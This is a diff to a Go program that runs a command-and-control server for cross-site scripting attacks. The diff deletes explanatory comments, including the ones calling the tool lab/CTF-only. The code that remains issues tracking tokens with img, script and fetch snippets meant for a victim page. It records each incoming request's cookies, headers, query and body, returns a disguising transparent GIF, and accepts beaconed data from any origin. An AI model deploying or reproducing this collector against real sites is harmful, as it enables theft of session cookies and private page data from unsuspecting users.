@@ -37,7 +37,6 @@ var (
 )
 
 func main() {
-	// allow overriding file via env for tests
 	if v := os.Getenv("XSS_C2_DATAFILE"); v != "" {
 		dataFile = v
 	}
@@ -46,7 +45,6 @@ func main() {
 		log.Printf("warning: could not load submissions: %v", err)
 	}
 
-	// create data directory if path contains dirs
 	if dir := filepath.Dir(dataFile); dir != "." {
 		os.MkdirAll(dir, 0700)
 	}
@@ -68,28 +66,19 @@ func main() {
 	}
 	addr := ":" + port
 	log.Printf("starting XSS backend on %s (datafile=%s)", addr, dataFile)
-	// wrap the default mux with a simple CORS middleware so preflight and
-	// Access-Control-Allow-Origin are handled globally (helps when deployed)
 	handler := corsMiddleware(http.DefaultServeMux)
 	if err := http.ListenAndServe(addr, handler); err != nil {
 		log.Fatalf("server failed: %v", err)
 	}
 }
 
-// corsMiddleware adds permissive CORS headers (lab-only) and handles OPTIONS
-// preflight requests. It applies these headers to every response so redirects
-// or other endpoints still include the necessary CORS headers.
 func corsMiddleware(next http.Handler) http.Handler {
 	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		// For lab/CTF usage we default to allowing all origins. If you need
-		// credentialed requests, change this to echo the Origin and set
-		// Access-Control-Allow-Credentials: true (and avoid '*').
 		w.Header().Set("Access-Control-Allow-Origin", "*")
 		w.Header().Set("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
 		w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
 
 		if r.Method == http.MethodOptions {
-			// Preflight request - no body
 			w.WriteHeader(http.StatusNoContent)
 			return
 		}
@@ -102,8 +91,6 @@ func dashboardHandler(w http.ResponseWriter, r *http.Request) {
 	mu.Lock()
 	defer mu.Unlock()
 
-	// Render the dashboard showing recent submissions. Template uses automatic
-	// escaping to help avoid accidental reflected XSS in the admin UI.
 	data := struct {
 		Submissions []Submission
 		Now         time.Time
@@ -118,7 +105,6 @@ func dashboardHandler(w http.ResponseWriter, r *http.Request) {
 	}
 }
 
-// beaconHandler accepts POST with JSON body {"data": "..."} and records it
 func beaconHandler(w http.ResponseWriter, r *http.Request) {
 	if r.Method != http.MethodPost {
 		w.Header().Set("Allow", "POST")
@@ -126,7 +112,7 @@ func beaconHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	var payload struct{
+	var payload struct {
 		Data string `json:"data"`
 	}
 	dec := json.NewDecoder(r.Body)
@@ -165,7 +151,6 @@ func beaconHandler(w http.ResponseWriter, r *http.Request) {
 	json.NewEncoder(w).Encode(map[string]any{"status":"ok","id":s.ID})
 }
 
-// submissionsAPIHandler returns the submissions as JSON (read-only GET).
 func submissionsAPIHandler(w http.ResponseWriter, r *http.Request) {
 	if r.Method != http.MethodGet {
 		w.Header().Set("Allow", "GET")
@@ -178,9 +163,6 @@ func submissionsAPIHandler(w http.ResponseWriter, r *http.Request) {
 	json.NewEncoder(w).Encode(submissions)
 }
 
-// registerHandler creates a new random tracking token and returns a URL and
-// a small HTML snippet you can use to trigger the tracking endpoint from a
-// victim page (e.g. via <img>, <script>, fetch, or XHR).
 func registerHandler(w http.ResponseWriter, r *http.Request) {
 	if r.Method != http.MethodPost && r.Method != http.MethodGet {
 		w.Header().Set("Allow", "GET, POST")
@@ -188,7 +170,6 @@ func registerHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// generate 8 random bytes -> 16 hex chars
 	b := make([]byte, 8)
 	if _, err := rand.Read(b); err != nil {
 		http.Error(w, "internal error", http.StatusInternalServerError)
@@ -203,8 +184,8 @@ func registerHandler(w http.ResponseWriter, r *http.Request) {
 <!-- or fetch: fetch('%s', {mode:'no-cors'}) -->`, trackPath, trackPath, trackPath)
 
 	resp := map[string]any{
-		"token": token,
-		"url":   trackPath,
+		"token":   token,
+		"url":     trackPath,
 		"snippet": snippet,
 	}
 
@@ -212,33 +193,25 @@ func registerHandler(w http.ResponseWriter, r *http.Request) {
 	json.NewEncoder(w).Encode(resp)
 }
 
-// trackHandler captures any incoming request to /track/<token> and records
-// the full request metadata (method, url, headers, query, cookies, body)
 func trackHandler(w http.ResponseWriter, r *http.Request) {
-	// extract token from path
 	token := strings.TrimPrefix(r.URL.Path, "/track/")
 	if token == "" {
 		http.NotFound(w, r)
 		return
 	}
 
-	// read a limited amount of the body
 	var bodyStr string
 	if r.Body != nil {
-		// limit to 50KB to avoid resource abuse
 		buf := make([]byte, 50000)
 		n, _ := r.Body.Read(buf)
-		// read remainder (if any) to drain
 		rest, _ := io.ReadAll(r.Body)
 		if len(rest) > 0 && n < len(buf) {
-			// append rest
 			buf = append(buf[:n], rest...)
 			n = len(buf)
 		}
 		bodyStr = string(buf[:n])
 	}
 
-	// build dump
 	var b strings.Builder
 	fmt.Fprintf(&b, "Captured at: %s\n", time.Now().Format(time.RFC3339))
 	fmt.Fprintf(&b, "Token: %s\n", token)
@@ -265,7 +238,6 @@ func trackHandler(w http.ResponseWriter, r *http.Request) {
 	}
 	fmt.Fprintf(&b, "\n-- Body (first 50KB) --\n%s\n", bodyStr)
 
-	// create a submission and save
 	s := Submission{
 		Source:    token,
 		Data:      b.String(),
@@ -287,7 +259,6 @@ func trackHandler(w http.ResponseWriter, r *http.Request) {
 		log.Printf("warning: could not save submissions: %v", err)
 	}
 
-	// reply with a small transparent GIF so image hits look "realistic" to pages
 	gif := []byte{
 		0x47, 0x49, 0x46, 0x38, 0x39, 0x61,
 		0x01, 0x00, 0x01, 0x00, 0x80, 0x00,
@@ -305,10 +276,8 @@ func trackHandler(w http.ResponseWriter, r *http.Request) {
 }
 
 func remoteIP(r *http.Request) string {
-	// Try X-Forwarded-For then fallback to RemoteAddr
 	xff := r.Header.Get("X-Forwarded-For")
 	if xff != "" {
-		// may contain comma-separated list; take the first
 		for i := 0; i < len(xff); i++ {
 			if xff[i] == ',' {
 				return strings.TrimSpace(xff[:i])
@@ -317,7 +286,6 @@ func remoteIP(r *http.Request) string {
 		return strings.TrimSpace(xff)
 	}
 	ra := r.RemoteAddr
-	// RemoteAddr is usually host:port. Strip port if present.
 	for i := len(ra) - 1; i >= 0; i-- {
 		if ra[i] == ':' {
 			return ra[:i]
@@ -342,7 +310,6 @@ func loadSubmissions() error {
 		return err
 	}
 	submissions = s
-	// set nextID
 	next := 1
 	for _, it := range submissions {
 		if it.ID >= next {
@@ -356,7 +323,6 @@ func loadSubmissions() error {
 func saveSubmissions() error {
 	mu.Lock()
 	defer mu.Unlock()
-	// write to temp file then rename to avoid corruption
 	tmp := dataFile + ".tmp"
 	f, err := os.Create(tmp)
 	if err != nil {
@@ -371,3 +337,4 @@ func saveSubmissions() error {
 	f.Close()
 	return os.Rename(tmp, dataFile)
 }
+
